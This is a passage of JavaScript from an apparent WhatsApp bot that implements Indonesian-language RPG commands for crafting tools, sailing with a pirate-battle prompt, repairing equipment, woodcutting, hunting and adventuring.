					if (db.data.rpg[m.sender].pickaxe) return newReply('Kamu Sudah Memiliki Pickaxe!')
					let besi = Number(2)
					let kayu = Number(1)
					if (db.data.rpg[m.sender].besi < besi) return newReply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Membuat Pickaxe*\n\nUntuk Membuat Pickaxe Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
					if (db.data.rpg[m.sender].kayu < kayu) return newReply(`*Kayu Kamu (${db.data.rpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Pickaxe*\n\nUntuk Membuat Pickaxe Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
					db.data.rpg[m.sender].pickaxe = true
					db.data.rpg[m.sender].besi -= besi
					db.data.rpg[m.sender].kayu -= kayu
					let pickaxe = `*Berhasil Membuat Pickaxe!*\n\nSisa Sumberdaya:\n- Besi: ${db.data.rpg[m.sender].besi}\n- Kayu: ${db.data.rpg[m.sender].kayu}\n\n`
					await sock.sendMessage(m.chat, {
						text: pickaxe,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: saluran,
								serverMessageId: null,
								newsletterName: saluranName
							},
							externalAdReply: {
								title: "RPG-GAME (Tools Crafting)",
								body: 'Making equipment',
								thumbnailUrl: "https://telegra.ph/file/9bd57cb7d6e04a4a51d7c.jpg",
								sourceUrl: wagc,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				} else if (args[0] === "bajuzirah") {
					if (db.data.rpg[m.sender].bzirah) return newReply('Kamu Sudah Memiliki Baju Zirah!')
					let besi = Number(6)
					let kayu = Number(2)
					let kain = Number(10)
					if (db.data.rpg[m.sender].besi < besi) return newReply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
					if (db.data.rpg[m.sender].kayu < kayu) return newReply(`*Kayu Kamu (${db.data.rpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
					if (db.data.rpg[m.sender].kain < kain) return newReply(`*Kain Kamu (${db.data.rpg[m.sender].kain}) Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Crafting Kain Terlebih Dahulu!`)
					db.data.rpg[m.sender].bzirah = true
					db.data.rpg[m.sender].besi -= besi
					db.data.rpg[m.sender].kayu -= kayu
					db.data.rpg[m.sender].kain -= kain
					let bajuzirah = `*Berhasil Membuat Baju Zirah!*\n\nSisa Sumberdaya:\n- Besi: ${db.data.rpg[m.sender].besi}\n- Kayu: ${db.data.rpg[m.sender].kayu}\n- Kain: ${db.data.rpg[m.sender].kain}\n\n`
					await sock.sendMessage(m.chat, {
						text: bajuzirah,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: saluran,
								serverMessageId: null,
								newsletterName: saluranName
							},
							externalAdReply: {
								title: "RPG-GAME (Tools Crafting)",
								body: 'Making equipment',
								thumbnailUrl: "https://telegra.ph/file/2a8bf170a5b74aa808078.jpg",
								sourceUrl: wagc,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				} else if (args[0] === "pedang") {
					if (db.data.rpg[m.sender].pedang) return newReply('Kamu Sudah Memiliki Pedang!')
					let besi = Number(3)
					let kayu = Number(1)
					if (db.data.rpg[m.sender].besi < besi) return newReply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Membuat Pedang*\n\nUntuk Membuat Pedang Diperlukan *3 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
					if (db.data.rpg[m.sender].kayu < kayu) return newReply(`*Kayu Kamu (${db.data.rpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Pedang*\n\nUntuk Membuat Pedang Diperlukan *3 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
					db.data.rpg[m.sender].pedang = true
					db.data.rpg[m.sender].besi -= besi
					db.data.rpg[m.sender].kayu -= kayu
					let pedang = `*Berhasil Membuat Pedang!*\n\nSisa Sumberdaya:\n- Besi: ${db.data.rpg[m.sender].besi}\n- Kayu: ${db.data.rpg[m.sender].kayu}\n\n`
					await sock.sendMessage(m.chat, {
						text: pedang,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: saluran,
								serverMessageId: null,
								newsletterName: saluranName
							},
							externalAdReply: {
								title: "RPG-GAME (Tools Crafting)",
								body: 'Making equipment',
								thumbnailUrl: "https://telegra.ph/file/0c245751d14b42fe7f3c0.jpg",
								sourceUrl: wagc,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				} else {
					let craft = "";
					craft += "*Apa yang ingin Kamu buat?*\n\n";
					craft += "- kapal\n";
					craft += "- rumah\n";
					craft += "- kapak\n";
					craft += "- pickaxe\n";
					craft += "- pedang\n";
					craft += "- bajuzirah\n";
					craft += "- kain\n\n";
					craft += "*Contoh:*\n";
					craft += ".craft kapak\n";
					await sock.sendMessage(m.chat, {
						text: craft,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: saluran,
								serverMessageId: null,
								newsletterName: saluranName
							},
							externalAdReply: {
								title: "RPG-GAME (Crafting Item)",
								body: 'Make items for survival and adventure',
								thumbnailUrl: "https://telegra.ph/file/fed81e9a280d8a3965d6f.jpg",
								sourceUrl: wagc,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				}
			}
			db.data.users[m.sender].limit -= 1;
			break

			case 'berlayar': {
				if (!db.data.users[m.sender].rpg) return newReply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				if (!db.data.rpg[m.sender].kapal) return newReply('Kamu Tidak Mempunyai Kapal, Silahkan Crafting Kapal Terlebih Dahulu!')
				if (db.data.rpg[m.sender].darahkapal < 1) return newReply('Kapal Kamu Rusak, Perbaiki Terlebih Dahulu Kapal Mu\n\nKetik .rawat')
				if (pirates[m.sender]) return newReply("Kamu sedang berlayar!!")
				if (db.data.rpg[m.sender].wilayah === args[0]) return newReply(`Kamu Sedang Di ${args[0]} Saat Ini, Silahkan Pilih Destinasi Lain`)
				if (args[0] === "indonesia") {
					editp('Menyiapkan Perbekalan...', 'Melepaskan Tali Kapal...', 'Kapal Mulai Berlayar Menjauhi Pelabuhan...')
					let jnskpl = ["kargo", "pesiar", "nelayan", "perang", "tanker", "kontainer", "feri"]
					let kruu = [14, 68, 64, 44, 24, 6, 8, 48, 32, 18, 10, 22, 6, 42, 12]
					let jeniskapal = await pickRandom(jnskpl)
					let kru = await pickRandom(kruu)
					db.data.rpg[m.sender].wilayah = args[0]
					await sleep(10000)
					let teks = `Ditengah perjalanan ke\n${args[0]} Kamu bertemu\ndengan kapal *${jeniskapal}*\nyang memiliki kru dengan\njumlah *${kru} orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Serang🏴‍☠️\",\"id\":\"serang\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".nyerah\"}`
					}]
					pirates[m.sender] = [
						await sock.sendButtonText(m.chat, button, `*PIRATE BATTLE 🏴‍☠️*\n`, teks, footer, m), jeniskapal, kru, args[0],
						setTimeout(() => {
							if (pirates[m.sender]) {
								db.data.rpg[m.sender].darahkapal = 0
								newReply("*Kamu telah terdeteksi perompak, kapal mu di bom tentara*")
								delete pirates[m.sender]
							}
						}, 120000)
					]
				} else if (args[0] === "india") {
					editp('Menyiapkan Perbekalan...', 'Melepaskan Tali Kapal...', 'Kapal Mulai Berlayar Menjauhi Pelabuhan...')
					let jnskpl = ["kargo", "pesiar", "nelayan", "perang", "tanker", "kontainer", "feri"]
					let kruu = [14, 68, 64, 44, 24, 6, 8, 48, 32, 18, 10, 22, 6, 42, 12]
					let jeniskapal = await pickRandom(jnskpl)
					let kru = await pickRandom(kruu)
					db.data.rpg[m.sender].wilayah = args[0]
					await sleep(10000)
					let teks = `Ditengah perjalanan ke\n${args[0]} Kamu bertemu\ndengan kapal *${jeniskapal}*\nyang memiliki kru dengan\njumlah *${kru} orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Serang🏴‍☠️\",\"id\":\"serang\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".nyerah\"}`
					}]
					pirates[m.sender] = [
						await sock.sendButtonText(m.chat, button, `*PIRATE BATTLE 🏴‍☠️*\n`, teks, footer, m), jeniskapal, kru, args[0],
						setTimeout(() => {
							if (pirates[m.sender]) {
								db.data.rpg[m.sender].darahkapal = 0
								newReply("*Kamu telah terdeteksi perompak, kapal mu di bom tentara*")
								delete pirates[m.sender]
							}
						}, 120000)
					]
				} else if (args[0] === "brazil") {
					editp('Menyiapkan Perbekalan...', 'Melepaskan Tali Kapal...', 'Kapal Mulai Berlayar Menjauhi Pelabuhan...')
					let jnskpl = ["kargo", "pesiar", "nelayan", "perang", "tanker", "kontainer", "feri"]
					let kruu = [14, 68, 64, 44, 24, 6, 8, 48, 32, 18, 10, 22, 6, 42, 12]
					let jeniskapal = await pickRandom(jnskpl)
					let kru = await pickRandom(kruu)
					db.data.rpg[m.sender].wilayah = args[0]
					await sleep(10000)
					let teks = `Ditengah perjalanan ke\n${args[0]} Kamu bertemu\ndengan kapal *${jeniskapal}*\nyang memiliki kru dengan\njumlah *${kru} orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Serang🏴‍☠️\",\"id\":\"serang\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".nyerah\"}`
					}]
					pirates[m.sender] = [
						await sock.sendButtonText(m.chat, button, `*PIRATE BATTLE 🏴‍☠️*\n`, teks, footer, m), jeniskapal, kru, args[0],
						setTimeout(() => {
							if (pirates[m.sender]) {
								db.data.rpg[m.sender].darahkapal = 0
								newReply("*Kamu telah terdeteksi perompak, kapal mu di bom tentara*")
								delete pirates[m.sender]
							}
						}, 120000)
					]
				} else if (args[0] === "rusia") {
					editp('Menyiapkan Perbekalan...', 'Melepaskan Tali Kapal...', 'Kapal Mulai Berlayar Menjauhi Pelabuhan...')
					let jnskpl = ["kargo", "pesiar", "nelayan", "perang", "tanker", "kontainer", "feri"]
					let kruu = [14, 68, 64, 44, 24, 6, 8, 48, 32, 18, 10, 22, 6, 42, 12]
					let jeniskapal = await pickRandom(jnskpl)
					let kru = await pickRandom(kruu)
					db.data.rpg[m.sender].wilayah = args[0]
					await sleep(10000)
					let teks = `Ditengah perjalanan ke\n${args[0]} Kamu bertemu\ndengan kapal *${jeniskapal}*\nyang memiliki kru dengan\njumlah *${kru} orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Serang🏴‍☠️\",\"id\":\"serang\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".nyerah\"}`
					}]
					pirates[m.sender] = [
						await sock.sendButtonText(m.chat, button, `*PIRATE BATTLE 🏴‍☠️*\n`, teks, footer, m), jeniskapal, kru, args[0],
						setTimeout(() => {
							if (pirates[m.sender]) {
								db.data.rpg[m.sender].darahkapal = 0
								newReply("*Kamu telah terdeteksi perompak, kapal mu di bom tentara*")
								delete pirates[m.sender]
							}
						}, 120000)
					]
				} else if (args[0] === "australia") {
					editp('Menyiapkan Perbekalan...', 'Melepaskan Tali Kapal...', 'Kapal Mulai Berlayar Menjauhi Pelabuhan...')
					let jnskpl = ["kargo", "pesiar", "nelayan", "perang", "tanker", "kontainer", "feri"]
					let kruu = [14, 68, 64, 44, 24, 6, 8, 48, 32, 18, 10, 22, 6, 42, 12]
					let jeniskapal = await pickRandom(jnskpl)
					let kru = await pickRandom(kruu)
					db.data.rpg[m.sender].wilayah = args[0]
					await sleep(10000)
					let teks = `Ditengah perjalanan ke\n${args[0]} Kamu bertemu\ndengan kapal *${jeniskapal}*\nyang memiliki kru dengan\njumlah *${kru} orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Serang🏴‍☠️\",\"id\":\"serang\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".nyerah\"}`
					}]
					pirates[m.sender] = [
						await sock.sendButtonText(m.chat, button, `*PIRATE BATTLE 🏴‍☠️*\n`, teks, footer, m), jeniskapal, kru, args[0],
						setTimeout(() => {
							if (pirates[m.sender]) {
								db.data.rpg[m.sender].darahkapal = 0
								newReply("*Kamu telah terdeteksi perompak, kapal mu di bom tentara*")
								delete pirates[m.sender]
							}
						}, 120000)
					]
				} else if (args[0] === "kanada") {
					editp('Menyiapkan Perbekalan...', 'Melepaskan Tali Kapal...', 'Kapal Mulai Berlayar Menjauhi Pelabuhan...')
					let jnskpl = ["kargo", "pesiar", "nelayan", "perang", "tanker", "kontainer", "feri"]
					let kruu = [14, 68, 64, 44, 24, 6, 8, 48, 32, 18, 10, 22, 6, 42, 12]
					let jeniskapal = await pickRandom(jnskpl)
					let kru = await pickRandom(kruu)
					db.data.rpg[m.sender].wilayah = args[0]
					await sleep(10000)
					let teks = `Ditengah perjalanan ke\n${args[0]} Kamu bertemu\ndengan kapal *${jeniskapal}*\nyang memiliki kru dengan\njumlah *${kru} orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Serang🏴‍☠️\",\"id\":\"serang\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".nyerah\"}`
					}]
					pirates[m.sender] = [
						await sock.sendButtonText(m.chat, button, `*PIRATE BATTLE 🏴‍☠️*\n`, teks, footer, m), jeniskapal, kru, args[0],
						setTimeout(() => {
							if (pirates[m.sender]) {
								db.data.rpg[m.sender].darahkapal = 0
								newReply("*Kamu telah terdeteksi perompak, kapal mu di bom tentara*")
								delete pirates[m.sender]
							}
						}, 120000)
					]
				} else if (args[0] === "greenland") {
					editp('Menyiapkan Perbekalan...', 'Melepaskan Tali Kapal...', 'Kapal Mulai Berlayar Menjauhi Pelabuhan...')
					let jnskpl = ["kargo", "pesiar", "nelayan", "perang", "tanker", "kontainer", "feri"]
					let kruu = [14, 68, 64, 44, 24, 6, 8, 48, 32, 18, 10, 22, 6, 42, 12]
					let jeniskapal = await pickRandom(jnskpl)
					let kru = await pickRandom(kruu)
					db.data.rpg[m.sender].wilayah = args[0]
					await sleep(10000)
					let teks = `Ditengah perjalanan ke\n${args[0]} Kamu bertemu\ndengan kapal *${jeniskapal}*\nyang memiliki kru dengan\njumlah *${kru} orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Serang🏴‍☠️\",\"id\":\"serang\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".nyerah\"}`
					}]
					pirates[m.sender] = [
						await sock.sendButtonText(m.chat, button, `*PIRATE BATTLE 🏴‍☠️*\n`, teks, footer, m), jeniskapal, kru, args[0],
						setTimeout(() => {
							if (pirates[m.sender]) {
								db.data.rpg[m.sender].darahkapal = 0
								newReply("*Kamu telah terdeteksi perompak, kapal mu di bom tentara*")
								delete pirates[m.sender]
							}
						}, 120000)
					]
				} else {
					let berlayar = "";
					berlayar += "*Pilih Destinasi Berlayar!*\n\n";
					berlayar += "🔵 indonesia\n";
					berlayar += "🔴 kanada\n";
					berlayar += "⚪ rusia\n";
					berlayar += "⚫ india\n";
					berlayar += "🟣 brazil\n";
					berlayar += "🟠 australia\n";
					berlayar += "🟢 greenland\n\n";
					berlayar += `Contoh:\n${prefix + command} rusia\n`;
					await sock.sendMessage(m.chat, {
						text: berlayar,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: saluran,
								serverMessageId: null,
								newsletterName: saluranName
							},
							externalAdReply: {
								title: "PIRATE ADVENTURE",
								body: 'Sail across the ocean and go on adventures',
								thumbnailUrl: "https://telegra.ph/file/4275a0a1fcf450835b0ef.jpg",
								sourceUrl: wagc,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				}
			}
			db.data.users[m.sender].limit -= 1;
			break

			case 'repair':
			case 'rawat': {
				if (!db.data.users[m.sender].rpg) return newReply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				let rawat = args[0]
				switch (rawat) {
					case 'kapal':
						if (!db.data.rpg[m.sender].kapal) return newReply(`*🙃 Kamu Gak Punya Kapal*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Kapal`)
						if (!db.data.rpg[m.sender].darahkapal < 1) return newReply(`*😑 Kapal Kamu Masih Bagus*`)
						if (db.data.rpg[m.sender].besi < 5) return newReply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Kapal*\n\nUntuk Perbaikan Kapal Diperlukan *5 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
						if (db.data.rpg[m.sender].kayu < 10) return newReply(`*Kayu Kamu (${db.data.rpg[m.sender].kayu}) Tidak Cukup Untuk Perbaikan Kapal*\n\nUntuk Perbaikan Kapal Diperlukan *10 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
						db.data.rpg[m.sender].besi -= 5
						db.data.rpg[m.sender].kayu -= 10
						db.data.rpg[m.sender].darahkapal = 100
						editp('Memperbaiki, Mohon Tunggu😘', 'Tahap Finishing 🥳', 'Done Perbaikan 😄')
						break

					case 'pickaxe':
						if (!db.data.rpg[m.sender].pickaxe) return newReply(`*🙃 Kamu Gak Punya Pickaxe*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Pickaxe`)
						if (!db.data.rpg[m.sender].darahpickaxe < 1) return newReply(`*😑 Pickaxe Kamu Masih Bagus*`)
						if (db.data.rpg[m.sender].besi < 1) return newReply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Pickaxe*\n\nUntuk Perbaikan Pickaxe Diperlukan *1 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
						db.data.rpg[m.sender].besi -= 1
						db.data.rpg[m.sender].darahpickaxe = 100
						editp('Memperbaiki, Mohon Tunggu😘', 'Tahap Finishing 🥳', 'Done Perbaikan 😄')
						break

					case 'kapak':
						if (!db.data.rpg[m.sender].kapak) return newReply(`*🙃 Kamu Gak Punya Kapak*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Kapak`)
						if (!db.data.rpg[m.sender].darahkapak < 1) return newReply(`*😑 Kapak Kamu Masih Bagus*`)
						if (db.data.rpg[m.sender].besi < 1) return newReply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Kapak*\n\nUntuk Perbaikan Kapak Diperlukan *1 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
						db.data.rpg[m.sender].besi -= 1
						db.data.rpg[m.sender].darahkapak = 100
						editp('Memperbaiki, Mohon Tunggu😘', 'Tahap Finishing 🥳', 'Done Perbaikan 😄')
						break

					case 'armor':
						if (!db.data.rpg[m.sender].bzirah) return newReply(`*🙃 Kamu Gak Punya Baju Zirah*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Baju Zirah`)
						if (!db.data.rpg[m.sender].darahbzirah < 1) return newReply(`*😑 Baju Zirah Kamu Masih Bagus*`)
						if (db.data.rpg[m.sender].besi < 2) return newReply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Armor*\n\nUntuk Perbaikan Armor Diperlukan *2 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
						db.data.rpg[m.sender].besi -= 2
						db.data.rpg[m.sender].darahbzirah = 100
						editp('Memperbaiki, Mohon Tunggu😘', 'Tahap Finishing 🥳', 'Done Perbaikan 😄')
						break

					case 'pedang':
						if (!db.data.rpg[m.sender].pedang) return newReply(`*🙃 Kamu Gak Punya Pedang*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Pedang`)
						if (!db.data.rpg[m.sender].darahpedang < 1) return newReply(`*😑 Pedang Kamu Masih Bagus*`)
						if (db.data.rpg[m.sender].besi < 1) return newReply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Pedang*\n\nUntuk Perbaikan Pedang Diperlukan *1 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
						db.data.rpg[m.sender].besi -= 1
						db.data.rpg[m.sender].darahpedang = 100
						editp('Memperbaiki, Mohon Tunggu😘', 'Tahap Finishing 🥳', 'Done Perbaikan 😄')
						break
					default:
					let teks = "";
					teks += "-「 *PERBAIKAN* 」-\n\n";
					teks += "*Pilih Barang Yang*\n";
					teks += "*Akan Diperbaiki*\n";
					teks += "- kapal\n";
					teks += "- pickaxe\n";
					teks += "- kapak\n";
					teks += "- armor\n";
					teks += "- pedang\n\n";
					teks += "*Contoh:*\n";
					teks += `${prefix + command} kapak\n`;
						sock.sendMessage(m.chat, {
							text: teks,
							contextInfo: {
								mentionedJid: [m.sender],
								forwardingScore: 9999,
								isForwarded: true,
								forwardedNewsletterMessageInfo: {
									newsletterJid: saluran,
									serverMessageId: null,
									newsletterName: saluranName
								},
								externalAdReply: {
									title: "RPG TOOLS REPAIR",
									body: 'Repairs and upgrades tools',
									thumbnailUrl: "https://telegra.ph/file/08e78c20afd16dcebb33d.jpg",
									sourceUrl: wagc,
									mediaType: 1,
									renderLargerThumbnail: true
								}
							}
						}, {
							quoted: m
						})
				}
			}
			db.data.users[m.sender].limit -= 1;
			break

			case 'menebang':
			case 'nebang': {
				if (!db.data.users[m.sender].rpg) return newReply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				if (!db.data.rpg[m.sender].kapak) return newReply('Kamu Tidak Memiliki Kapak, Silahkan Buat Terlebih Dahulu\n\nKetik _.craft_')
				if (db.data.rpg[m.sender].darahkapak < 1) return newReply('☹️Kapak Kamu Rusak\nRawat Dulu Alat Tebangmu\n\nKetik _.rawat_')
				let kayu = await randomNomor(0, 20)
				db.data.rpg[m.sender].kayu += kayu
				db.data.rpg[m.sender].darahkapak -= 20
				let message = "";
				message += "*🌳 MENEBANG POHON 🌳*\n\n";
				message += "Item Yang Didapat:\n";
				message += `- Kayu: ${kayu} (Hasil Tebang)\n`;
				message += "- Kapak: -20 Healthy (Digunakan)\n";

				newReply(message);
			}
			db.data.users[m.sender].limit -= 1;
			break

			case 'berburu': {
				if (!db.data.users[m.sender].rpg) return newReply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				let domba = await randomNomor(0, 10)
				let sapi = await randomNomor(0, 10)
				let ayam = await randomNomor(0, 10)
				let buulu = domba + sapi + ayam
				let bulu = buulu / 2
				let waktuu = await clockString(new Date() - db.data.rpg[m.sender].burutime)
				if (new Date() - db.data.rpg[m.sender].burutime < 7200000) return newReply(`Kamu Baru Saja Berburu ${waktuu} Yang Lalu, Silahkan Tunggu 2 Jam Setelah Terakhir Kali Berburu`)
				db.data.rpg[m.sender].burutime = new Date * 1
				db.data.rpg[m.sender].domba += domba
				db.data.rpg[m.sender].sapi += sapi
				db.data.rpg[m.sender].ayam += ayam
				db.data.rpg[m.sender].bulu += bulu
				let message = "";
				message += "*🏹 BERBURU 🏹*\n\n";
				message += "Item Yang Didapat:\n";
				message += `- Domba: ${domba}\n`;
				message += `- Sapi: ${sapi}\n`;
				message += `- Ayam: ${ayam}\n`;
				message += `- Bulu: ${bulu} (Hasil Pencabutan)\n\n`;
				message += "_Tunggu 2 jam untuk_\n";
				message += "_berburu berikutnya_\n";

				newReply(message);
			}
			db.data.users[m.sender].limit -= 1;
			break

			case 'adventure': {
				if (!db.data.users[m.sender].rpg) return newReply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				if (db.data.rpg[m.sender].darahuser < 1) return newReply('Kamu Lemah, Silahkan Sembuhkan Menggunakan Ramuan/Makanan\n\nKetik _.heal_')
				let tuju = args.join(" ")
				let obj = ["villager", "zombie", "ghasts", "wither", "skeleton", "wolves"]
				let obje = await pickRandom(obj)
				let kayu = await randomNomor(15)
				let besi = await randomNomor(10)
				let rank = await randomNomor(100)
				let saldo = await randomNomor(2000)
				if (tuju === "savanah") {
					db.data.rpg[m.sender].darahuser -= 20
					let thumbadv = "https://telegra.ph/file/1b27b199f440cd69be0aa.jpg"
					let {
						key
					} = await sock.sendMessage(m.chat, {
						text: 'Berpetualang, Mohon Tunggu...'
					}, {
						quoted: m
					})
					await sleep(3000)
					await sock.sendMessage(m.chat, {
						text: `Kamu bertemu dengan ${obje}`,
						edit: key
					});
					await sleep(5000)
					await sock.sendMessage(m.chat, {
						text: `Menjelajah...`,
						edit: key
					});
					await sleep(3000)
					let adv = "";
					adv += "-「 *ADVENTURE* 」-\n\n";
					adv += `*📍 ${text}*\n`;
					adv += `- Kayu: ${kayu}\n`;
					adv += `- Besi: ${besi}\n`;
					adv += `- Rank: ${rank}\n`;
					adv += `- Uang: Rp ${saldo}\n\n`;
					adv += "*Stamina berkurang -20*\n";
					await sock.sendMessage(m.chat, {
						text: adv,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: saluran,
								serverMessageId: null,
								newsletterName: saluranName
							},
							externalAdReply: {
								title: "RPG - ADVENTURE",
								body: 'Adventure exploring the world',
								thumbnailUrl: thumbadv,
								sourceUrl: "tes",
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
					db.data.rpg[m.sender].kayu += kayu
					db.data.rpg[m.sender].besi += besi
					db.data.rpg[m.sender].rank += rank
					db.data.rpg[m.sender].uang += saldo
				} else if (tuju === "dessert") {
					db.data.rpg[m.sender].darahuser -= 20
					let thumbadv = "https://telegra.ph/file/760e27568c0b2ccf07231.jpg"
					let {
						key
					} = await sock.sendMessage(m.chat, {
						text: 'Berpetualang, Mohon Tunggu...'
					}, {
						quoted: m
					})
					await sleep(3000)
					await sock.sendMessage(m.chat, {
						text: `Kamu bertemu dengan ${obje}`,
						edit: key
					});
					await sleep(5000)
					await sock.sendMessage(m.chat, {
						text: `Menjelajah...`,
						edit: key
					});
					await sleep(3000)
					let adv = "";
					adv += "-「 *ADVENTURE* 」-\n\n";
					adv += `*📍 ${text}*\n`;
					adv += `- Kayu: ${kayu}\n`;
					adv += `- Besi: ${besi}\n`;
					adv += `- Rank: ${rank}\n`;
					adv += `- Uang: Rp ${saldo}\n\n`;
					adv += "*Stamina berkurang -20*\n";
					await sock.sendMessage(m.chat, {
						text: adv,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: saluran,
								serverMessageId: null,
								newsletterName: saluranName
							},
							externalAdReply: {
								title: "RPG - ADVENTURE",
								body: 'Adventure exploring the world',
								thumbnailUrl: thumbadv,
								sourceUrl: "tes",
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
					db.data.rpg[m.sender].kayu += kayu
					db.data.rpg[m.sender].besi += besi
					db.data.rpg[m.sender].rank += rank
					db.data.rpg[m.sender].uang += saldo
				} else if (tuju === "boreal forest") {
					db.data.rpg[m.sender].darahuser -= 20
					let thumbadv = "https://telegra.ph/file/1a528cf0c7e1eb0e74976.jpg"
					let {
						key
					} = await sock.sendMessage(m.chat, {
						text: 'Berpetualang, Mohon Tunggu...'
					}, {
						quoted: m
					})
					await sleep(3000)
